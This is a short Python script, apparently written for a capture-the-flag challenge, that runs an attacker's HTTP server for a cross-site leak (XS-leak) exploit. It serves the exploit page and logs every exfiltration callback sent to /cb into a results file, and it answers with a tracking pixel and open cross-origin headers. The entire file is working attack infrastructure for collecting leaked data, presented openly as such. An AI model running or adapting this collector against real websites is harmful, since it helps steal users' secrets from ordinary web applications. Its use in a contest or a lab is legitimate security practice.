#!/usr/bin/env python3
"""HTTP server that serves exploit files and logs all incoming requests (exfil callbacks)."""
import http.server
import os
import sys
from datetime import datetime
from urllib.parse import urlparse, parse_qs

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
SERVE_DIR = os.path.dirname(os.path.abspath(__file__))


class ExfilHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=SERVE_DIR, **kwargs)

    def do_GET(self):
        ts = datetime.now().strftime("%H:%M:%S")
        parsed = urlparse(self.path)

        if parsed.path.startswith("/cb"):
            # Callback - log the exfil data
            params = parse_qs(parsed.query)
            flat = {k: v[0] for k, v in params.items()}
            print(f"\n[{ts}] CALLBACK: {flat}", flush=True)

            # Also append to log file
            with open(os.path.join(SERVE_DIR, "exfil_results.log"), "a") as f:
                f.write(f"[{ts}] {flat}\n")

            # Return 1x1 pixel
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            # 1x1 transparent GIF
            self.wfile.write(
                b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
            )
        else:
            # Serve static files normally
            print(f"[{ts}] SERVE: {self.path} from {self.client_address[0]}", flush=True)
            super().do_GET()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging


if __name__ == "__main__":
    print(f"[*] Serving files from: {SERVE_DIR}")
    print(f"[*] Listening on port {PORT}")
    print(f"[*] Exploit URL: http://IP:{PORT}/xs_leak_exploit.html#HackOn{{")
    print(f"[*] Callbacks will appear below...\n")
    server = http.server.HTTPServer(("0.0.0.0", PORT), ExfilHandler)
    server.serve_forever()
